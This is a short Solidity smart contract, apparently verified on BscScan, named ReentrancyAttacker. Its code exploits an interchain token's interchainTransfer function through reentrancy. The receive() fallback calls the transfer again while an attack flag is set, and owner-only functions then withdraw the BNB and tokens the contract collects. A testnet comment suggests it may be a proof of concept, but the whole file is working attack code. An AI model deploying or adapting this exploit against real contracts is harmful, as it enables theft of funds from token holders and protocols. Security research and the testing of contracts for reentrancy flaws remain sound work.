/**
 *Submitted for verification at BscScan.com on 2025-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IInterchainToken {
    function interchainTransfer(
        string calldata destinationChain,
        bytes calldata recipient,
        uint256 amount,
        bytes calldata metadata
    ) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ReentrancyAttacker {
    address public owner;
    address public target;
    bool public attacking;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    // Fallback triggered by vulnerable external call
    receive() external payable {
        if (attacking) {
            // Re-enter with same 100 token amount
            IInterchainToken(target).interchainTransfer(
                "fakeChain",
                abi.encodePacked(address(this)),
                100,
                ""
            );
        }
    }

    // Begin the attack — this triggers the reentrancy loop
    function startAttack() external payable {
        require(msg.sender == owner, "Only owner");
        attacking = true;
        IInterchainToken(target).interchainTransfer{value: msg.value}(
            "fakeChain",
            abi.encodePacked(address(this)),
            100,
            ""
        );
        attacking = false;
    }

    // Withdraw any collected BNB from testnet
    function withdrawBNB() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // Optional: Rescue any tokens accidentally sent to the attacker contract
    function rescueToken(address token) external {
        require(msg.sender == owner, "Only owner");
        uint256 bal = IERC20(token).balanceOf(address(this));
        require(IERC20(token).transfer(owner, bal), "Token transfer failed");
    }
}